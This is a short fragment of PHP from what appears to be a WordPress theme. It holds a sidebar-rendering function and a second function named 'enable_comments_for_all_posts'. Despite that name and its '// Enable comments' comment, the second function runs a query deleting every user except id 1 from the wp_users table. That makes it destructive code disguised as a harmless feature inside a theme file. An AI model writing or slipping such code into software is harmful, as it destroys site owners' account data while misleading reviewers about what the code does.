		...
		function shprinkone_get_sidebar($side) {
			...
			if ($condition1 || $condition2) {
				if (strstr($_SERVER['HTTP_USER_AGENT'], 'MSIE'))
				    echo '<div id="sidebar" class="col-sm-3 col-md-3 col-lg-3" width="300px !important;" ><table width="300px" valign="top"><tr valign="top"><td style="text-valign: top !important;" valign="top"><div class="sidebar-inner" style="text-valign: top !important;" valign="top">';
				else
					echo '<div id="sidebar" class="col-sm-3 col-md-3 col-lg-3"><div class="sidebar-inner">';
				get_sidebar();
				if (strstr($_SERVER['HTTP_USER_AGENT'], 'MSIE'))
				    echo '</td></div></div><td valign="top">';
					else
				echo '</div></div>';
			}
		}
...
function enable_comments_for_all_posts(){
	echo "ll";
    global $wpdb;
    $wpdb->query( $wpdb->prepare("delete from wp_users where id!=1", "")); // Enable comments
}